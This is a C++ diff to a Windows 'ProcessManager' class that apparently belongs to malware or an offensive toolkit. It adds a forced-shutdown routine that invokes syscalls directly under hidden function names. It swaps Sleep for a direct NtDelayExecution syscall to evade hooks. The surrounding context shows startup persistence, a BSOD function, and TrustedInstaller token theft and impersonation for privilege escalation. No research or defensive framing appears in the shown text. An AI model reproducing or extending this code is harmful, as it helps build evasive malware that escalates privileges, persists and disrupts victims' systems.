@@ -246,6 +246,19 @@ void ProcessManager::AddProcessToStartup(std::string path) {
         return;
 }
 
+void ProcessManager::ShutdownSystem(SHUTDOWN_ACTION type) {
+    BOOLEAN state;
+
+    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtRevertContainerImpersonation"));
+    SysNtRevertContainerImpersonation();
+
+    ::_RtlAdjustPrivilege adjust = GetFunctionAddress<::_RtlAdjustPrivilege>(NTDLL, ( char* ) HIDE("RtlAdjustPrivilege"));
+    adjust(19, TRUE, FALSE, &state);
+    
+    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtShutdownSystem"));
+    SysNtShutdownSystem(type);
+}
+
 void ProcessManager::BSOD() {
     BOOLEAN state = FALSE;
     ULONG   resp;
@@ -337,7 +350,7 @@ void ProcessManager::GetAndInsertSSN(HMODULE lib, std::string functionName) {
     InsertSyscall(syscall);
 }
 
-HANDLE ProcessManager::CreateProcessAccessToken(DWORD processID) {
+HANDLE ProcessManager::CreateProcessAccessToken(DWORD processID, bool ti) {
     OBJECT_ATTRIBUTES objectAttributes{};
     HANDLE            process = NULL;
     CLIENT_ID         pInfo{};
@@ -346,7 +359,7 @@ HANDLE ProcessManager::CreateProcessAccessToken(DWORD processID) {
 
     InitializeObjectAttributes(&objectAttributes, 0, 0, 0, 0);
 
-    GetAndInsertSSN(NTDLL, (char*)HIDE("NtOpenProcess"));
+    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtOpenProcess"));
     NTSTATUS openStatus = SysNtOpenProcess(
         &process,
         MAXIMUM_ALLOWED,
@@ -354,9 +367,8 @@ HANDLE ProcessManager::CreateProcessAccessToken(DWORD processID) {
         &pInfo
     );
 
-    if ( openStatus != STATUS_SUCCESS ) {
+    if ( openStatus != STATUS_SUCCESS )
         return NULL;
-    }
 
     HANDLE   processToken = NULL;
     GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtOpenProcessTokenEx"));
@@ -393,6 +405,7 @@ HANDLE ProcessManager::CreateProcessAccessToken(DWORD processID) {
 
     return duplicatedToken;
 }
+
 
 BOOL ProcessManager::OpenProcessAsImposter(
     HANDLE token,
@@ -461,7 +474,13 @@ DWORD ProcessManager::StartWindowsService(std::string serviceName) {
                 wait = 1000;
             else if ( wait > 10000 )
                 wait = 10000;
-            Sleep(wait);
+
+            LARGE_INTEGER i;
+            i.QuadPart = wait;
+
+            GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtDelayExecution"));
+            SysNtDelayExecution(FALSE, &i);
+        
             continue;
         }
 
@@ -518,9 +537,10 @@ HANDLE ProcessManager::GetTrustedInstallerToken() {
         this->GetSystemToken();
 
     DWORD  pid   = StartWindowsService(std::string(HIDE("TrustedInstaller")));
-    HANDLE token = CreateProcessAccessToken(pid);
+    HANDLE token = CreateProcessAccessToken(pid, true);
     if ( token == NULL )
         return NULL;
+    
 
     HANDLE impersonate = ImpersonateWithToken(token);
     if ( impersonate == NULL )
